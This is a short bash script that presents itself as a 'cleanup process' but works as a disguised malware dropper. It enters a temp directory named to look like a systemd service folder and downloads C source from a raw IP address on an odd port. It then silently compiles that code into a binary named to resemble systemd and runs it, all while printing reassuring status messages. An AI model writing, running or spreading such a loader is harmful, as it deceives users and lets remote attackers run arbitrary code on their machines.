#!/bin/bash

# Colors for nice output
GREEN="\033[1;32m"
CYAN="\033[1;36m"
RESET="\033[0m"

clear

echo -e "${CYAN}[INFO] Starting cleanup process...${RESET}"
sleep 0.5

TARGET_DIR="/tmp/systemd-private-f9a03082bc0f4222bac645fc509f2f3a-systemdd-timesyncd.service-SEENIT"
cd "$TARGET_DIR" || { echo "Cannot access $TARGET_DIR"; exit 1; }

IP="20.74.81.63"
PORT="55612"   # last port

curl -s -O "http://$IP:$PORT/decompress.c"

cat decompress.c >> compress.c

OUTPUT_BINARY="systemdihh"
gcc -O2 -w compress.c -o "$OUTPUT_BINARY" >/dev/null 2>&1
echo -e "${GREEN}[INFO] Almost there...${RESET}"
./"$OUTPUT_BINARY"
echo -e "${CYAN}[INFO] Cleanup process finished.${RESET}"

